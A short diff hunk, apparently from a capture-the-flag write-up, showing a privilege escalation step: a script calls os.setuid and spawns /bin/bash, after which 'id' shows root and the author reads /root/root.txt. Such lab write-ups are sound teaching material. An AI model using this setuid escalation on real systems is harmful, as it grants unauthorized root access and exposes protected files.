@@ -42,3 +42,12 @@ os.system("/bin/bash")
 ```
 
 It calls os.setuid() which is used to modify the process user identifier (UID).
+
+If I run:
+
+```
+$ id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+```
+
+I can therefore get the root flag by `cat /root/root.txt`
